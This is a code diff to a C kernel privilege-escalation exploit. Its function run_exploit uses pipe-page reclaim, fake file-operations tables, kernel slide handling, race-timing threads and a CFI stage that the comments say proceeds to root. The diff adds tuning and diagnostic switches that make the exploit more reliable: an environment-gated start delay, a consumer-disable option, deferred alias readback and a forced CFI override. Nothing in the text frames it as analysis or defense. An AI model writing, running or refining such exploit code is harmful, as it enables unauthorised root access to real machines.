@@ -105,6 +105,19 @@ void *consumer_thread(void *arg __attribute__((unused))) {
     seen = seq;
     int tid = atomic_load(&waiter_tid);
     int calls_this_seq = 0;
+    {
+      /* Per-attempt one-shot delay for manual timing tuning. */
+      const char *delay_text = getenv("CONSUMER_START_DELAY_USEC");
+      if (delay_text && *delay_text) {
+        char *end = NULL;
+        errno = 0;
+        long delay_value = strtol(delay_text, &end, 0);
+        if (errno == 0 && end != delay_text && *end == '\0' &&
+            delay_value > 0 && delay_value <= 10000000L) {
+          usleep((useconds_t)delay_value);
+        }
+      }
+    }
     while (!atomic_load(&punch_consume_stop) &&
            atomic_load(&punch_consume_go) == seq) {
       if (atomic_load(&punch_consume_stop) ||
@@ -120,6 +133,7 @@ void *consumer_thread(void *arg __attribute__((unused))) {
             atomic_load(&punch_consume_go) != seq) {
           break;
         }
+#if CONSUMER_MAX_CALLS > 0
         atomic_fetch_add(&consumer_calls, 1);
         int consumer_nice = PSELECT_CONSUMER_NICE;
         errno = 0;
@@ -136,6 +150,13 @@ void *consumer_thread(void *arg __attribute__((unused))) {
           atomic_store(&punch_consume_go, 0);
           break;
         }
+#else
+        /* CONSUMER_MAX_CALLS == 0 disables the consumer: route will miss
+         * until do_pselect_fake_lock_route() times out on pselect and
+         * clears punch_consume_go. */
+        (void)calls_this_seq;
+        (void)tid;
+#endif
       }
     }
   }
@@ -415,7 +436,18 @@ static int verify_fops_data_alias_before_production(void) {
     reset_pipe_attempt();
   }
 #else
+#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
+    APP_FOPS_DEFER_ALIAS_READBACK
+  /* The deferred postwrite reader (after the production trigger) needs
+   * this exact verified pipe set alive: reset would close every reclaim
+   * fd and the read fails EBADF. The gate consumed one page per pipe;
+   * one page was rewritten after, so reread is safe. */
+  if (!fops_data_alias_deferred) {
+    reset_pipe_attempt();
+  }
+#else
   reset_pipe_attempt();
+#endif
 #endif
   pr_info("fops data alias selected verified=%d runtime_slide=%08zx "
           "uses_slide=%d\n",
@@ -476,7 +508,17 @@ int run_exploit(int argc, char **argv) {
     return 1;
   }
 #else
+#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
+    APP_FOPS_DEFER_ALIAS_READBACK
+  /* Same lifecycle as the verifier tail: the deferred postwrite reader
+   * needs the verified reclaim set alive through the production trigger.
+   * Skip the reset only while armed; otherwise behave as before. */
+  if (!fops_data_alias_deferred) {
+    reset_pipe_attempt();
+  }
+#else
   reset_pipe_attempt();
+#endif
 #if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
   if (!prepare_p0_pipe_oracle()) {
     pr_error("fops oracle pipe preparation failed\n");
@@ -581,9 +623,20 @@ int run_exploit(int argc, char **argv) {
     APP_FOPS_DEFER_ALIAS_READBACK
     int postwrite_result = 0;
     int probe_restored = 0;
+    /* Diagnostic override (env-gated, default off): run the CFI read-back
+     * even when the pipe-alias postwrite disagrees, to learn whether the
+     * production WRITE landed (cfi decides) vs the alias READER is broken.
+     * A passing CFI proceeds to root automatically. */
+    int force_cfi = 0;
+    {
+      const char *force_env = getenv("CFI_FORCE_DIAG");
+      force_cfi = force_env && strcmp(force_env, "1") == 0;
+    }
     if (fops_data_alias_deferred) {
-      postwrite_result = verify_p0_pipe_data_page(
-          fops_data_alias_deferred_target, fake_fops);
+      int prod_touched = -1;
+      postwrite_result = probe_fops_and_production_touch(
+          fops_data_alias_deferred_target, fake_fops, &prod_touched);
+      pr_info("fops postwrite prod_touched=%d\n", prod_touched);
       probe_restored =
           app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_RESTORE_SLOT);
       pr_info("fops postwrite direct read target=%016zx initial=%016llx "
@@ -603,7 +656,12 @@ int run_exploit(int argc, char **argv) {
 #endif
       fops_data_alias_deferred = 0;
     }
-    if (triggered && postwrite_result == 1 && probe_restored) {
+    if ((triggered && postwrite_result == 1 && probe_restored) ||
+        (triggered && force_cfi)) {
+      if (force_cfi && !(postwrite_result == 1 && probe_restored)) {
+        pr_warning("cfi force-diag override postwrite=%d restored=%d\n",
+                   postwrite_result, probe_restored);
+      }
       verified = try_cfi_stage();
     } else {
       cfi_last_step = 35;
